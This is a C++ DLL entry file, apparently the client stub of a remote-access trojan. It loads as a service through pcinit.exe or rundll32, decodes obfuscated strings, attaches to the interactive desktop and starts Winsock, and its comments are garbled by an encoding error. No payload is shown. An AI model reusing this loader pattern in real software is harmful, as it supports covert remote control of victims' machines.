// PcMain.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "MyClientMain.h"

CMyFunc	  m_gFunc;
UINT	  m_Ext_A[3] = {PS_EXT_A, PS_EXT_B, PS_EXT_C};
HINSTANCE m_ghInstance = NULL;
PSDLLINFO m_DllInfo = {0};

void WINAPI ServiceMain(HWND hwnd, HINSTANCE hinst, char* sCmdLines, int nCmdShow)
{
	//�����ִ���
	if(!m_gFunc.LoadMyData((BYTE*) m_ghInstance))
	{
		return;
	}

	//����ȫ�ֲ���
	CMyClientMain m_ClientMain;
	if(hwnd == (HWND) DLL_LOAD_FLAG && nCmdShow == DLL_LOAD_FLAG)
	{
		//��pcinit.exe����
		m_gFunc.memcpy(&m_DllInfo, sCmdLines, sizeof(m_DllInfo));

		//WinSta0
		char m_TmpStr[256] = {0};
		m_gFunc.GetMyString(10271, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
		
		//���õ�ǰ����̨
		HWINSTA hNorWinStat = m_gFunc.OpenWindowStation(m_TmpStr, TRUE, MAXIMUM_ALLOWED);
   		if(hNorWinStat != NULL)
		{
			m_gFunc.SetProcessWindowStation(hNorWinStat);
		}
		
		//Default
		m_gFunc.GetMyString(10256, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

		//���õ�ǰ����
		HDESK hNorDesktop = m_gFunc.OpenDesktop(m_TmpStr, DF_ALLOWOTHERACCOUNTHOOK, TRUE, MAXIMUM_ALLOWED);
		if(hNorDesktop != NULL)
		{
			m_gFunc.SetThreadDesktop(hNorDesktop);
		}
		m_ClientMain.DoWork();
	}
	else
	{
		//rundll32.exe����
		m_ClientMain.DoRundll32Work(sCmdLines);
	}
}

BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	if(DLL_PROCESS_ATTACH == fdwReason)
	{
		m_ghInstance = (HINSTANCE) hinstDLL;
		WSADATA	data = {0};
		WSAStartup(MAKEWORD(2, 2), &data);
	}
    return TRUE;
}

